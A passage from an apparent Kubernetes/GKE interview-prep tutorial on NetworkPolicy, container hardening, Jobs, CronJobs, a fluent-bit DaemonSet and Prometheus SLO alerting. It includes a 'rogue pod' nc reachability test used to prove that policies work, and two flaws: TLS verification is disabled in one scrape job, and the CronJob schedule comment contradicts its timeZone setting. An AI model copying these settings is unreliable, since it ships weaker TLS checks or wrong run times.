```

```yaml
# ONE ELEMENT with both selectors = AND.
# "pods labelled prometheus, IN namespace monitoring"
ingress:
  - from:
      - namespaceSelector:
          matchLabels:
            kubernetes.io/metadata.name: monitoring
        podSelector:
          matchLabels:
            app.kubernetes.io/name: prometheus
```

> **The difference is one `-` character, and it is the difference between a working policy and an open door.**
>
> The first (OR) allows **any pod in the monitoring namespace** *and also* **any pod anywhere called prometheus** — including one an attacker creates in `shopwave-dev` with that label. The second (AND) allows only the real Prometheus.
>
> This is the single most commonly-mis-written thing in NetworkPolicy. YAML makes it nearly invisible in review. **Always `kubectl get netpol -o yaml` and count the list elements** — do not trust your eyes on the indentation.

### `ipBlock` and pod IPs — the thing that breaks

> **`ipBlock` cannot select pods.** It's for external IPs. If you write `ipBlock: 10.44.0.0/14` (our pod CIDR) you are matching pod IPs by range, which "works" but is meaningless — it can't distinguish `payments` from `notifications`, and pod IPs are recycled constantly.
>
> Worse: **`ipBlock` rules do not apply to traffic from pods on the same node in some CNI implementations**, and the semantics for cluster-internal traffic are implementation-defined. **Use `podSelector` for pods; use `ipBlock` only for genuinely external addresses** — which for us means the GCLB health-check ranges (because with NEGs the LB talks to the pod IP directly and there's no pod to select) and the master CIDR.

## 15.5 Dataplane V2 policy logging — the killer feature

`13-security/90-logging.yaml`:

```yaml
apiVersion: networking.gke.io/v1alpha1
kind: NetworkLogging
metadata:
  name: default
spec:
  cluster:
    allow:
      log: false
      delegate: false
    deny:
      log: true
      delegate: false
```

```bash
kubectl logs -n kube-system -l k8s-app=cilium --tail=100 | grep -i "policy-verdict"
```

Or in Cloud Logging:

```
resource.type="k8s_node"
jsonPayload.connection.dest_port=5432
jsonPayload.disposition="deny"
```

> **This turns NetworkPolicy from "guess and check" into an actual engineering process:**
>
> 1. Deploy your policies with `deny.log: true`.
> 2. Run in **audit mode** — actually, and this is the key insight, you can't "audit" NetworkPolicy the way you can PSA, because there's no dry-run mode. So you do the reverse: **apply the policies in a staging namespace first**, watch the deny logs, and add rules until the log is silent.
> 3. Only then promote to prod.
>
> Without deny logs, a NetworkPolicy rollout is a series of mysterious timeouts and a lot of `kubectl exec ... nc -zv`. With them, the log **tells you the exact connection you forgot**. This is one of the best practical arguments for Dataplane V2 and a strong answer to "how do you safely roll out network policy?"

## 15.6 Verify

```bash
kubectl apply -f 13-security/
kubectl get networkpolicy -n shopwave-prod

# Prove it: frontend CAN reach catalog
kubectl exec -n shopwave-prod deploy/frontend -- \
  python -c "import socket; socket.create_connection(('catalog',8080),timeout=3); print('ALLOWED - correct')"

# Prove it: frontend CANNOT reach postgres
kubectl exec -n shopwave-prod deploy/frontend -- \
  python -c "
import socket
try:
    socket.create_connection(('postgres',5432), timeout=3)
    print('REACHED POSTGRES - POLICY IS BROKEN')
except Exception as e:
    print(f'BLOCKED - correct: {e}')
"

# Prove it: a rogue pod in dev cannot reach payments in prod
kubectl run rogue -n shopwave-dev --rm -it --image=busybox:1.36 --restart=Never -- \
  timeout 5 nc -zv payments.shopwave-prod 8080
```

> The third test is the one to actually run in an interview story. **Before** the policies, it connects. **After**, it hangs and times out. That's the demonstration that "a namespace is not a security boundary, but a namespace plus NetworkPolicy is."

## 15.7 The rest of the security posture

**securityContext** — every container in this document has:

```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 10001
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop:
      - ALL
  seccompProfile:
    type: RuntimeDefault
```

> **`allowPrivilegeEscalation: false` sets the `no_new_privs` bit** in the kernel. It means a `setuid` binary inside the container **cannot gain privileges**. Even if an attacker gets a shell as UID 10001 and finds a setuid-root binary, it won't elevate. It's one flag and it closes a whole category.
>
> **`capabilities: drop: [ALL]`** — Docker grants 14 capabilities by default, including `NET_RAW` (**raw sockets → ARP spoofing, packet sniffing on the pod network**), `CHOWN`, `SETUID`, `SETGID`, `MKNOD`. A web app needs **none** of them. `drop: ALL` and re-add only what you provably need (`NET_BIND_SERVICE` if you must bind <1024 — though the real answer is *don't*, bind 8080 and let the Service map it).
>
> **`seccompProfile: RuntimeDefault`** — a syscall filter blocking ~44 of the ~350 Linux syscalls, including the ones used by most container escapes. **It is not on by default** (`Unconfined` is), which surprises people. `restricted` PSS requires it. It costs nothing.

**Container escape mitigation summary — the layers, and this is the good answer:**

| Layer | Control | Blocks |
|---|---|---|
| Image | Distroless, non-root, no shell | Post-exploitation tooling |
| Supply chain | Binary Authorization, scanning, digest pinning | Running untrusted code at all |
| Container | `drop: ALL`, `no_new_privs`, seccomp, read-only rootfs | Privilege escalation, syscall abuse |
| Pod | PSA `restricted`, no hostPath/hostNetwork/hostPID | Namespace escape |
| Identity | Workload Identity, `automountServiceAccountToken: false`, `GKE_METADATA` | Credential theft |
| Network | Default-deny NetworkPolicy, `except` RFC1918 | Lateral movement, exfiltration |
| Node | Shielded nodes, Secure Boot, COS, least-privilege node SA | Rootkits, node → project escalation |
| Cluster | Private nodes, master authorized networks, RBAC | Reachability, authorisation |
| Runtime (optional) | **GKE Sandbox (gVisor)** | Kernel exploits — a syscall-interposing userspace kernel |

> **GKE Sandbox / gVisor** is the answer to "what if the kernel itself has a CVE?" It runs each pod against a **userspace kernel** that implements the syscall interface, so a kernel exploit hits gVisor, not the host. Cost: ~10–30% performance, no direct hardware access, some syscalls unsupported. You'd use it for genuinely untrusted multi-tenant code, not for `catalog`. Naming it, and naming the cost, is the complete answer.

## 15.8 Part 15 interview talking points

- **The default is wide open** — every pod to every pod, every namespace
- The five NetworkPolicy evaluation rules: no-policy = open; any policy = default-deny for that direction; additive with **no deny**; **both sides must allow**; **stateful, so no return-traffic rules**
- **Default-deny breaks DNS first** — and the symptom is name-resolution failure, not connection refused
- TCP/53 as well as UDP/53
- **The AND vs OR trap** — one `-` character
- **`ipBlock: 0.0.0.0/0` includes RFC1918 and the metadata server** — the `except` block
- `egress: []` to forbid all outbound from a database — and how it interacts additively with the shared DNS policy
- On GKE the **API server is not a pod** — allow the master CIDR as an ipBlock
- Peer-to-peer policies for Redis/Elasticsearch replication
- `ipBlock` can't select pods; with NEGs the LB is external so health checks need ipBlock
- **DPv2 policy deny-logging** as the way to roll policy out safely
- `no_new_privs`, `drop: ALL` (especially `NET_RAW`), `RuntimeDefault` seccomp is **not** the default
- The full defence-in-depth layer table, ending at gVisor and its cost


---

# Part 16 — Batch, DaemonSets, and Observability

## 16.1 Jobs

`14-batch/00-migration-job.yaml` — a one-shot schema migration:

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: shopwave-migrate-1-1-0
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: migrate
    app.kubernetes.io/part-of: shopwave
spec:
  backoffLimit: 4
  completions: 1
  parallelism: 1
  activeDeadlineSeconds: 900
  ttlSecondsAfterFinished: 3600
  template:
    metadata:
      labels:
        app.kubernetes.io/name: migrate
        app.kubernetes.io/part-of: shopwave
    spec:
      restartPolicy: Never
      serviceAccountName: orders
      automountServiceAccountToken: false
      enableServiceLinks: false
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        seccompProfile:
          type: RuntimeDefault
      nodeSelector:
        pool: app
      containers:
        - name: migrate
          image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/orders:1.1.0
          command:
            - python
            - -c
            - |
              import os, sys, psycopg2
              # Migrations must be IDEMPOTENT. This Job WILL be retried.
              conn = psycopg2.connect(
                  host=os.environ["DB_HOST"], dbname=os.environ["DB_NAME"],
                  user=os.environ["DB_USER"], password=os.environ["DB_PASSWORD"])
              with conn.cursor() as cur:
                  cur.execute("""
                      ALTER TABLE orders
                        ADD COLUMN IF NOT EXISTS channel TEXT DEFAULT 'web';
                      CREATE INDEX IF NOT EXISTS idx_orders_channel
                        ON orders(channel);
                  """)
              conn.commit()
              print("migration 1.1.0 applied")
              sys.exit(0)
          env:
            - name: DB_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: postgres-credentials
                  key: password
          envFrom:
            - configMapRef:
                name: orders-config
          resources:
            requests:
              cpu: 100m
              memory: 128Mi
            limits:
              cpu: 500m
              memory: 256Mi
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
```

### The four fields that define Job semantics

| Field | Meaning |
|---|---|
| `completions` | How many pods must succeed for the Job to be Complete |
| `parallelism` | How many run at once |
| `backoffLimit` | How many **total** failures before the Job is marked Failed (default 6) |
| `activeDeadlineSeconds` | Wall-clock limit. **Overrides `backoffLimit`** — the Job is killed regardless of retries left |

> **`restartPolicy` inside a Job is not what you think.**
>
> - `restartPolicy: Never` — a failed container means the **pod fails**, and the Job controller creates a **new pod**. You get a pod per attempt, so `kubectl logs` on each is available. **This is what you want** for debugging.
> - `restartPolicy: OnFailure` — the **kubelet restarts the container in the same pod**. The Job controller never sees a new pod. Logs from earlier attempts are **gone** (only `--previous` gives you one back), and the pod count doesn't tell you how many attempts happened.
>
> `Never` + `backoffLimit` is the better default. Almost everyone reaches for `OnFailure` and then can't debug the failure.

> **`ttlSecondsAfterFinished` — set it, always.** Without it, completed Job objects and their pods **accumulate forever** in etcd. A CronJob running every 5 minutes for a year leaves ~105,000 Job objects. `kubectl get pods` becomes unusable, etcd grows, and list calls time out. It's a `TTLAfterFinished` controller and it's been GA since 1.23. This is one of the most common real-world cluster-hygiene failures.

> **`backoffLimit` uses exponential backoff capped at 6 minutes** — 10s, 20s, 40s... A `backoffLimit: 6` Job that fails every time takes roughly 20 minutes to give up. `activeDeadlineSeconds` is the hard stop and it wins.

> **The pattern that matters: every migration must be idempotent.** `ADD COLUMN IF NOT EXISTS`. Because the Job **will** be retried — a node dies mid-migration, the pod is recreated, and your migration runs a second time against a half-migrated database. `IF NOT EXISTS` is not laziness; it's correctness.

## 16.2 CronJob

`14-batch/10-digest-cronjob.yaml`:

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: shopwave-nightly-digest
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: digest
    app.kubernetes.io/part-of: shopwave
spec:
  schedule: "30 18 * * *"          # 18:30 UTC = midnight IST
  timeZone: "Asia/Kolkata"
  concurrencyPolicy: Forbid
  startingDeadlineSeconds: 300
  successfulJobsHistoryLimit: 3
  failedJobsHistoryLimit: 3
  suspend: false
  jobTemplate:
    spec:
      backoffLimit: 6
      activeDeadlineSeconds: 3600
      ttlSecondsAfterFinished: 86400
      template:
        metadata:
          labels:
            app.kubernetes.io/name: digest
            app.kubernetes.io/part-of: shopwave
        spec:
          restartPolicy: Never
          serviceAccountName: notifications
          automountServiceAccountToken: false
          enableServiceLinks: false
          terminationGracePeriodSeconds: 25
          priorityClassName: shopwave-low
          securityContext:
            runAsNonRoot: true
            runAsUser: 10001
            fsGroup: 10001
            seccompProfile:
              type: RuntimeDefault
          containers:
            - name: digest
              image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/notifications:1.0.0
              # Overrides the image's ENTRYPOINT (gunicorn).
              command: ["python", "digest_job.py"]
              envFrom:
                - configMapRef:
                    name: notifications-config
              resources:
                requests:
                  cpu: 200m
                  memory: 256Mi
                limits:
                  cpu: 1000m
                  memory: 512Mi
              securityContext:
                allowPrivilegeEscalation: false
                readOnlyRootFilesystem: true
                capabilities:
                  drop:
                    - ALL
              volumeMounts:
                - name: state
                  mountPath: /state
                - name: tmp
                  mountPath: /tmp
          volumes:
            # Checkpoint survives a container restart within the pod, but NOT
            # a Spot preemption (the whole pod dies). That's fine: digest_job.py
            # restarts from 0 in that case, and it's idempotent.
            - name: state
              emptyDir:
                sizeLimit: 64Mi
            - name: tmp
              emptyDir:
                sizeLimit: 32Mi
```

### The CronJob fields that bite

**`concurrencyPolicy`:**

| Value | Behaviour |
|---|---|
| `Allow` | **Default.** Overlapping runs are permitted. |
| `Forbid` | Skip the new run if the previous one is still going. |
| `Replace` | Kill the running one, start the new one. |

> **`Allow` is the default and it is almost always wrong.** A digest job that normally takes 4 minutes hits a slow database and takes 25. Your `*/5` schedule now has **five concurrent copies**, all hammering the same slow database, making it slower, spawning more copies. That is a self-inflicted DoS with a cron expression. **`Forbid` is the sane default.**

**`startingDeadlineSeconds: 300`** — if the controller misses a scheduled time (control plane down, cluster busy) by more than 300s, **skip that run** rather than firing late.

> **The 100-missed-schedules rule — a real, famous failure.** If you **omit** `startingDeadlineSeconds`, the CronJob controller counts missed schedules from `lastScheduleTime`. If it finds **more than 100** missed, it **gives up entirely** and logs:
> ```
> Cannot determine if job needs to be started: too many missed start times (> 100). Set or decrease .spec.startingDeadlineSeconds or check clock skew
> ```
> and **the CronJob never runs again** until you touch it. So: suspend a `*/1` CronJob for two hours, unsuspend, and it is **permanently dead** with a message nobody reads. Setting `startingDeadlineSeconds` bounds the lookback window and prevents it. This is an excellent, specific gotcha.

**`timeZone: "Asia/Kolkata"`** — GA in 1.27. Before that, **CronJob schedules were always in the control plane's timezone (UTC)**, and everyone hard-coded UTC offsets that broke twice a year for anyone with DST. Naming that this field exists (and that it's recent) is a good currency signal.

**`suspend: true`** is your CronJob kill switch during an incident:

```bash
kubectl patch cronjob shopwave-nightly-digest -n shopwave-prod \
  -p '{"spec":{"suspend":true}}'
```

**Run it right now, by hand:**

```bash
kubectl create job --from=cronjob/shopwave-nightly-digest \
  digest-manual-$(date +%s) -n shopwave-prod
```

That is *the* command for testing a CronJob without waiting for midnight, and for re-running a failed batch during an incident.

```bash
kubectl get cronjob -n shopwave-prod
kubectl get jobs -n shopwave-prod
kubectl logs -n shopwave-prod job/digest-manual-1721300000
```

## 16.3 The `log-shipper` DaemonSet

`15-daemonset/00-log-shipper.yaml`:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: log-shipper
  namespace: platform
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: log-shipper
rules:
  - apiGroups: [""]
    resources: ["pods", "namespaces"]
    verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: log-shipper
subjects:
  - kind: ServiceAccount
    name: log-shipper
    namespace: platform
roleRef:
  kind: ClusterRole
  name: log-shipper
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: log-shipper-config
  namespace: platform
data:
  fluent-bit.conf: |
    [SERVICE]
        Flush             5
        Daemon            Off
        Log_Level         info
        Parsers_File      parsers.conf
        HTTP_Server       On
        HTTP_Listen       0.0.0.0
        HTTP_Port         2020
        Health_Check      On
        storage.path      /var/log/flb-storage/
        storage.sync      normal
        storage.backlog.mem_limit  16M

    [INPUT]
        Name              tail
        Tag               kube.*
        Path              /var/log/containers/*.log
        Exclude_Path      /var/log/containers/*log-shipper*.log
        Parser            cri
        DB                /var/log/flb_kube.db
        Mem_Buf_Limit     16MB
        Skip_Long_Lines   On
        Refresh_Interval  10
        storage.type      filesystem

    [FILTER]
        Name                kubernetes
        Match               kube.*
        Kube_URL            https://kubernetes.default.svc:443
        Kube_Tag_Prefix     kube.var.log.containers.
        Merge_Log           On
        Merge_Log_Key       log_processed
        Keep_Log            Off
        K8S-Logging.Parser  On
        K8S-Logging.Exclude On
        Labels              On
        Annotations         Off

    [FILTER]
        Name                nest
        Match               kube.*
        Operation           lift
        Nested_under        kubernetes
        Add_prefix          k8s_

    [OUTPUT]
        Name                stdout
        Match               kube.shopwave*
        Format              json_lines

  parsers.conf: |
    [PARSER]
        Name        cri
        Format      regex
        Regex       ^(?<time>[^ ]+) (?<stream>stdout|stderr) (?<logtag>[^ ]*) (?<message>.*)$
        Time_Key    time
        Time_Format %Y-%m-%dT%H:%M:%S.%L%z
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: log-shipper
  namespace: platform
  labels:
    app.kubernetes.io/name: log-shipper
    app.kubernetes.io/component: logging
    app.kubernetes.io/part-of: shopwave
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: log-shipper
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
      maxSurge: 0
  template:
    metadata:
      labels:
        app.kubernetes.io/name: log-shipper
        app.kubernetes.io/component: logging
        app.kubernetes.io/part-of: shopwave
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "2020"
        prometheus.io/path: "/api/v1/metrics/prometheus"
    spec:
      serviceAccountName: log-shipper
      automountServiceAccountToken: true
      enableServiceLinks: false
      terminationGracePeriodSeconds: 30
      priorityClassName: system-node-critical

      # A log shipper must run on EVERY node, including tainted ones.
      # If it skips the system pool, you lose the logs of the components
      # you most need logs from during an incident.
      tolerations:
        - operator: Exists

      securityContext:
        runAsUser: 0            # honest: reading /var/log/containers needs root
        seccompProfile:
          type: RuntimeDefault

      containers:
        - name: fluent-bit
          image: fluent/fluent-bit:3.0.7
          ports:
            - name: http
              containerPort: 2020
          env:
            - name: NODE_NAME
              valueFrom:
                fieldRef:
                  fieldPath: spec.nodeName
          resources:
            requests:
              cpu: 50m
              memory: 96Mi
            limits:
              cpu: 300m
              memory: 256Mi
          livenessProbe:
            httpGet:
              path: /
              port: http
            periodSeconds: 20
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /api/v1/health
              port: http
            periodSeconds: 10
            failureThreshold: 3
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
              add:
                - DAC_READ_SEARCH
          volumeMounts:
            - name: varlog
              mountPath: /var/log
            - name: varlibdockercontainers
              mountPath: /var/lib/docker/containers
              readOnly: true
            - name: config
              mountPath: /fluent-bit/etc/
      volumes:
        - name: varlog
          hostPath:
            path: /var/log
            type: Directory
        - name: varlibdockercontainers
          hostPath:
            path: /var/lib/docker/containers
            type: DirectoryOrCreate
        - name: config
          configMap:
            name: log-shipper-config
```

### Why this is a DaemonSet and what that means

**A DaemonSet runs exactly one pod per node** (matching its selector), and it is the **only** workload type where the pod count is a function of the cluster, not of a `replicas` field.

Facts that get asked:

- **DaemonSet pods bypass much of the scheduler's usual behaviour** — historically they were scheduled by the DaemonSet controller itself. Since 1.12 the **default scheduler** places them, using an auto-injected `nodeAffinity` on `metadata.name`. That's why `kubectl describe pod` on a DaemonSet pod shows a `nodeAffinity` you never wrote.
- **DaemonSet pods get auto-injected tolerations** for `not-ready`, `unreachable`, `disk-pressure`, `memory-pressure`, `pid-pressure`, `unschedulable`, and `network-unavailable`. That is *why* a log shipper keeps running on a node the kubelet has declared broken — which is exactly when you need its logs.
- `updateStrategy: RollingUpdate, maxUnavailable: 1` — updates one node at a time. `OnDelete` means you replace them by hand.
- `priorityClassName: system-node-critical` — so the Cluster Autoscaler and the eviction manager treat it as infrastructure, and it doesn't get evicted under node pressure.

> **`tolerations: - operator: Exists` — a bare `Exists` with no key tolerates EVERY taint.** That's what you want for a log shipper, a CNI agent, a node exporter, or a security agent. It's also, in the wrong hands, how a workload ends up on your dedicated database nodes. **`operator: Exists` with no key is the "toleration for everything" idiom** and you should recognise it instantly.

> **This DaemonSet is why `platform` is a `privileged` PSS namespace.** `hostPath` is blocked by `baseline`. `runAsUser: 0` is blocked by `restricted`. The log shipper **genuinely needs both** — `/var/log/containers` is root-owned symlinks into `/var/log/pods`. This is the honest reason platform namespaces are privileged, and being able to say *"here is exactly which control I relaxed and exactly why"* is far better than pretending everything is `restricted`.
>
> We narrow it as much as we can: `drop: ALL` then `add: DAC_READ_SEARCH` (bypass file read permission checks — the *only* thing root is needed for here), `readOnlyRootFilesystem: true`, and `readOnly: true` on the container-log mount.

> **`Exclude_Path /var/log/containers/*log-shipper*.log` is not a detail.** Without it, fluent-bit reads its own log, which produces a log line, which it reads, which produces a log line. **An infinite log-amplification loop that fills the node's disk in minutes**, triggers `DiskPressure`, and evicts every pod on the node. This has taken down real clusters. Every log shipper config in the world has this line and every engineer who has been burned by it can tell you why.

## 16.4 Prometheus

`16-observability/00-prometheus-rbac.yaml`:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: prometheus
  namespace: monitoring
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: prometheus
rules:
  - apiGroups: [""]
    resources: ["nodes", "nodes/metrics", "nodes/proxy", "services", "endpoints", "pods"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["extensions", "networking.k8s.io"]
    resources: ["ingresses"]
    verbs: ["get", "list", "watch"]
  - nonResourceURLs: ["/metrics", "/metrics/cadvisor"]
    verbs: ["get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: prometheus
subjects:
  - kind: ServiceAccount
    name: prometheus
    namespace: monitoring
roleRef:
  kind: ClusterRole
  name: prometheus
  apiGroup: rbac.authorization.k8s.io
```

> **`nonResourceURLs`** — a rule for URLs that are **not** Kubernetes objects, like `/metrics` and `/healthz`. You cannot express these with `apiGroups`/`resources`. Most people have never seen this field and it's a nice thing to know exists.

`16-observability/01-prometheus-config.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: prometheus-config
  namespace: monitoring
data:
  prometheus.yml: |
    global:
      scrape_interval: 30s
      scrape_timeout: 10s
      evaluation_interval: 30s
      external_labels:
        cluster: shopwave-prod
        region: asia-south1

    rule_files:
      - /etc/prometheus/rules/*.yml

    alerting:
      alertmanagers:
        - static_configs:
            - targets:
                - alertmanager:9093

    scrape_configs:
      # Application pods, discovered by annotation.
      # This is why every Deployment in Part 8 carries prometheus.io/scrape.
      - job_name: kubernetes-pods
        kubernetes_sd_configs:
          - role: pod
        relabel_configs:
          - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
            action: keep
            regex: "true"
          - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
            action: replace
            target_label: __metrics_path__
            regex: (.+)
          - source_labels: [__address__, __meta_kubernetes_pod_annotation_prometheus_io_port]
            action: replace
            target_label: __address__
            regex: ([^:]+)(?::\d+)?;(\d+)
            replacement: $1:$2
          - source_labels: [__meta_kubernetes_namespace]
            action: replace
            target_label: namespace
          - source_labels: [__meta_kubernetes_pod_name]
            action: replace
            target_label: pod
          - source_labels: [__meta_kubernetes_pod_node_name]
            action: replace
            target_label: node
          - source_labels: [__meta_kubernetes_pod_label_app_kubernetes_io_name]
            action: replace
            target_label: service
          - source_labels: [__meta_kubernetes_pod_label_topology_kubernetes_io_zone]
            action: replace
            target_label: zone
          # Drop pods that are terminating - they produce misleading gaps
          - source_labels: [__meta_kubernetes_pod_phase]
            action: drop
            regex: (Succeeded|Failed)

      - job_name: kubernetes-nodes-cadvisor
        scheme: https
        tls_config:
          ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
          insecure_skip_verify: true
        bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token
        kubernetes_sd_configs:
          - role: node
        relabel_configs:
          - action: labelmap
            regex: __meta_kubernetes_node_label_(.+)
          - target_label: __address__
            replacement: kubernetes.default.svc:443
          - source_labels: [__meta_kubernetes_node_name]
            regex: (.+)
            target_label: __metrics_path__
            replacement: /api/v1/nodes/${1}/proxy/metrics/cadvisor

      - job_name: kube-state-metrics
        kubernetes_sd_configs:
          - role: service
        relabel_configs:
          - source_labels: [__meta_kubernetes_service_name]
            action: keep
            regex: kube-state-metrics
```

`16-observability/02-prometheus-rules.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: prometheus-rules
  namespace: monitoring
data:
  shopwave.yml: |
    groups:
      - name: shopwave-slo
        interval: 30s
        rules:
          # Recording rules: precompute the expensive stuff.
          - record: shopwave:request_error_rate5m
            expr: |
              sum by (service) (rate(shopwave_requests_total{status=~"5.."}[5m]))
              /
              sum by (service) (rate(shopwave_requests_total[5m]))

          - record: shopwave:request_error_rate1h
            expr: |
              sum by (service) (rate(shopwave_requests_total{status=~"5.."}[1h]))
              /
              sum by (service) (rate(shopwave_requests_total[1h]))

          - record: shopwave:request_error_rate6h
            expr: |
              sum by (service) (rate(shopwave_requests_total{status=~"5.."}[6h]))
              /
              sum by (service) (rate(shopwave_requests_total[6h]))

          - record: shopwave:latency_p99_5m
            expr: |
              histogram_quantile(0.99,
                sum by (service, le) (rate(shopwave_request_duration_seconds_bucket[5m])))

      - name: shopwave-burn-rate-alerts
        rules:
          # SLO: 99.9% availability => error budget = 0.1%
          # Multi-window multi-burn-rate. See the note below.
          - alert: ShopwaveErrorBudgetBurnFast
            expr: |
              shopwave:request_error_rate5m{service=~"frontend|orders|payments"} > (14.4 * 0.001)
              and
              shopwave:request_error_rate1h{service=~"frontend|orders|payments"} > (14.4 * 0.001)
            for: 2m
            labels:
              severity: page
              team: shopwave
            annotations:
              summary: "{{ $labels.service }} is burning error budget 14.4x"
              description: "At this rate the 30-day budget is gone in ~2 days. Page now."
              runbook: "https://runbooks.shopwave.io/error-budget-burn"

          - alert: ShopwaveErrorBudgetBurnSlow
            expr: |
              shopwave:request_error_rate6h{service=~"frontend|orders|payments"} > (6 * 0.001)
              and
              shopwave:request_error_rate1h{service=~"frontend|orders|payments"} > (6 * 0.001)
            for: 15m
            labels:
              severity: ticket
              team: shopwave
            annotations:
              summary: "{{ $labels.service }} is burning error budget 6x"

      - name: shopwave-symptoms
        rules:
          - alert: ShopwavePodCrashLooping
            expr: |
              rate(kube_pod_container_status_restarts_total{namespace="shopwave-prod"}[15m]) * 900 > 3
            for: 5m
            labels:
              severity: ticket
            annotations:
              summary: "{{ $labels.pod }} restarted >3 times in 15m"

          - alert: ShopwavePodNotReady
            expr: |
              sum by (namespace, pod) (
                kube_pod_status_ready{namespace="shopwave-prod", condition="false"}
              ) == 1
            for: 15m
            labels:
              severity: ticket

          - alert: ShopwaveHPAMaxedOut
            expr: |
              kube_horizontalpodautoscaler_status_current_replicas{namespace="shopwave-prod"}
              ==
              kube_horizontalpodautoscaler_spec_max_replicas{namespace="shopwave-prod"}
            for: 20m
            labels:
              severity: ticket
            annotations:
              summary: "HPA {{ $labels.horizontalpodautoscaler }} is at max - no headroom left"

          - alert: ShopwavePDBBlockingDrains
            expr: kube_poddisruptionbudget_status_pod_disruptions_allowed{namespace="shopwave-prod"} == 0
            for: 30m
            labels:
              severity: ticket
            annotations:
              summary: "PDB {{ $labels.poddisruptionbudget }} allows 0 disruptions - upgrades will stall"

          - alert: ShopwavePVCAlmostFull
            expr: |
              kubelet_volume_stats_available_bytes{namespace="shopwave-prod"}
              / kubelet_volume_stats_capacity_bytes{namespace="shopwave-prod"} < 0.15
            for: 10m
            labels:
              severity: page
            annotations:
              summary: "PVC {{ $labels.persistentvolumeclaim }} under 15% free"

          - alert: ShopwaveCertificateExpiringSoon
            expr: |
              (kube_certificate_expiration_timestamp_seconds - time()) / 86400 < 21
            labels:
              severity: ticket
```

### Multi-window multi-burn-rate alerting — the SLO answer

> **This is the single most valuable SRE concept to be able to explain, and most candidates cannot.**
>
> **The old way:** `alert if error rate > 1% for 5 minutes`. Two failure modes: a 0.9% error rate that runs for a week silently destroys your SLO and never alerts; and a 30-second 2% blip pages you at 03:00 for something that consumed 0.001% of your budget.
>
> **The SLO way:** you don't alert on the error rate. **You alert on how fast you are consuming your error budget.**
>
> - SLO = 99.9% over 30 days → **error budget = 0.1%** of requests.
> - **Burn rate** = (current error rate) / (budget error rate). A burn rate of **1** exhausts the budget in exactly 30 days. A burn rate of **14.4** exhausts it in **~2 days**.
>
> The standard Google SRE workbook table:
>
> | Burn rate | Budget gone in | Long window | Short window | Severity |
> |---|---|---|---|---|
> | **14.4×** | ~2 days | 1h | 5m | **Page** |
> | **6×** | ~5 days | 6h | 30m | Ticket |
> | **3×** | ~10 days | 1d | 2h | Ticket |
> | **1×** | 30 days | 3d | 6h | Ticket |
>
> **Why two windows, AND-ed together?** The **long** window (1h) gives you *significance* — it won't fire on a 30-second blip. The **short** window (5m) gives you *recovery* — the alert **resolves quickly** once the problem stops, instead of staying lit for an hour because the 1h rate is still elevated. Without the short window your pages have a one-hour tail and on-call stops trusting them.
>
> **The result:** you page **only when a burn rate genuinely threatens the SLO**, the alert is proportional to user impact, and it clears fast. This is what "alert on symptoms, not causes" actually means in practice.

> **Recording rules exist for a reason.** `histogram_quantile(0.99, sum by (le) (rate(...[5m])))` across thousands of series is expensive, and an alerting rule evaluating it every 30 seconds will melt Prometheus. Recording rules precompute it once and store it as a new, cheap series. **Naming convention: `level:metric:operation`** — `shopwave:request_error_rate5m`. Interviewers notice the convention.

`16-observability/03-prometheus.yaml`:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: prometheus
  namespace: monitoring
  labels:
    app.kubernetes.io/name: prometheus
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: prometheus
  ports:
    - name: http
      port: 9090
      targetPort: http
---
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: prometheus
  namespace: monitoring
  labels:
    app.kubernetes.io/name: prometheus
    app.kubernetes.io/component: monitoring
spec:
  serviceName: prometheus
  replicas: 1
  selector:
    matchLabels:
      app.kubernetes.io/name: prometheus
  template:
    metadata:
      labels:
        app.kubernetes.io/name: prometheus
        app.kubernetes.io/component: monitoring
    spec:
      serviceAccountName: prometheus
      automountServiceAccountToken: true
      enableServiceLinks: false
      terminationGracePeriodSeconds: 300
      priorityClassName: shopwave-high
      securityContext:
        runAsNonRoot: true
        runAsUser: 65534
        runAsGroup: 65534
        fsGroup: 65534
        fsGroupChangePolicy: OnRootMismatch
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: prometheus
          image: prom/prometheus:v2.53.0
          args:
            - --config.file=/etc/prometheus/prometheus.yml
            - --storage.tsdb.path=/prometheus
            - --storage.tsdb.retention.time=5d
            - --storage.tsdb.retention.size=8GB
            - --web.enable-lifecycle
            - --web.enable-admin-api=false
          ports:
            - name: http
              containerPort: 9090
          resources:
            requests:
